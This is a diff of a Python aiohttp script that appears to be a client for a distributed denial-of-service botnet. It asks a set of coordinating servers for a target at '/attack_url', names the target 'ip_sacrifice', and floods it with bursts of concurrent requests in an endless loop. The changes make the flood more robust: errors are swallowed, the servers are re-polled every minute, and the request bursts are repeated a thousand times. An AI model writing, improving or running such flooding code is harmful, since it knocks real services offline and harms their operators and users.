@@ -1,5 +1,6 @@
 import datetime
 import asyncio
+import types
 
 import aiohttp
 from aiohttp import ClientTimeout
@@ -18,24 +19,30 @@ def timer(func):
 
 @timer
 async def get(url: str) -> None:
-
-    timeout = ClientTimeout(sock_read=0.5)
-    connector = aiohttp.TCPConnector(limit=500, limit_per_host=500,force_close=True)
-    async with aiohttp.ClientSession(connector=connector,timeout=timeout) as session:
-        task = [asyncio.create_task(session.get(url))
-        for i in range(100)]
-        await asyncio.gather(*task)
+    try:
+        timeout = ClientTimeout(sock_read=0.5)
+        connector = aiohttp.TCPConnector(limit=500, limit_per_host=500,force_close=True)
+        async with aiohttp.ClientSession(connector=connector,timeout=timeout) as session:
+            task = [asyncio.create_task(session.get(url))
+            for i in range(100)]
+            await asyncio.gather(*task)
+    except:
+        return None
 
 
 async def get_ip_sacrifice(ips: list) -> str:
-    async with aiohttp.ClientSession() as session:
+    try:
+        async with aiohttp.ClientSession() as session:
 
-        for ip in ips:
-            async with session.get(ip + "/attack_url") as response:
-                if response.status == 200:
-                    ip_sacrifice = await response.json()
-        return ip_sacrifice.get("url")
-
+            for ip in ips:
+                async with session.get(ip + "/attack_url") as response:
+                    if response.status == 200:
+                        ip_sacrifice = await response.json()
+                    else:
+                        return ""
+            return ip_sacrifice.get("url")
+    except:
+        return ""
 
 async def reed_servers_ip() -> list:
     ips_servers = []
@@ -59,11 +66,15 @@ async def delete(url) -> None:
 
 
 async def main():
-    ips_servers = await reed_servers_ip()
-    ip_sacrifice = await get_ip_sacrifice(ips_servers)
-
     while True:
-        await get(ip_sacrifice)
+        ips_servers = await reed_servers_ip()
+        ip_sacrifice = await get_ip_sacrifice(ips_servers)
+        if ip_sacrifice == "":
+            await asyncio.sleep(60)
+        else:
+            for _ in range(1000):
+                await get(ip_sacrifice)
+
 
 
 if __name__ == '__main__':
